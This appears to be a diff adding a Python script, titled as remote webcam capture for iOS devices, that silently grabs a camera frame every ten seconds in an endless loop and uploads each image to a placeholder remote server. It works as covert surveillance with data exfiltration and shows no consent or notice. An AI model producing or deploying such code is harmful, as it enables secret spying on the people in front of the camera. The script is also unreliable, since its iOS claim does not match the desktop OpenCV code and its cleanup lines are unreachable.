@@ -1,0 +1,30 @@
+# Remote Webcam Capture for iOS Devices
+
+import cv2
+import requests
+import time
+
+def capture_webcam():
+    # Open the webcam
+    cap = cv2.VideoCapture(0)
+    
+    while True:
+        # Capture frame-by-frame
+        ret, frame = cap.read()
+        
+        # Save the frame to a file
+        cv2.imwrite('webcam_capture.jpg', frame)
+        
+        # Send the image to a remote server
+        with open('webcam_capture.jpg', 'rb') as f:
+            requests.post('http://yourserver.com/upload', files={'file': f})
+        
+        # Wait for a specified time before capturing the next frame
+        time.sleep(10)
+
+    # Release the webcam
+    cap.release()
+    cv2.destroyAllWindows()
+
+if __name__ == "__main__":
+    capture_webcam()
